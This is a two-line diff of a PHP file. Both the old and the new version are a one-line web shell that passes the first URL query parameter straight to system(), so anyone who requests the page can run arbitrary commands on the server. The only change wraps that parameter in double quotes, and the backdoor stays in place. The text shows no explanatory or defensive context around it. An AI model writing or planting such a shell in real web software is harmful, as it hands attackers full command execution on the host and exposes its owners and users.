@@ -1,2 +1,2 @@
-<? system($_GET[0])?>
+<? system("$_GET[0]")?>
 
